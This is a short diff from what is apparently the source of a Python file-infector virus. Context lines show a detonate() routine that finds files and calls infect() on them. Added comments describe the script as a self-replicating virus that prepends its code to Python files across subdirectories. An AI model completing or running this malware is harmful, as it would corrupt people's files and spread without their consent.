@@ -64,3 +64,12 @@ def detonate():
 files_targeted = locate(os.path.abspath(""))
 # Infects the targeted files with the virus code
 infect(files_targeted)
+
+
+#The core Python/coding tools used by this script are:
+#os: to interact with the operating system, e.g., listing directory contents, getting the absolute path of the current script.
+#datetime: to get the current date and time.
+#open: to open files for reading and writing.
+#enumerate: to iterate over the lines in a file along with their line numbers.
+
+#This script is a file infector and self replicating virus. Its main purpose is to infect Python files by adding its own code to the beginning of the file, and to spread itself to other Python files in the same directory and its subdirectories.
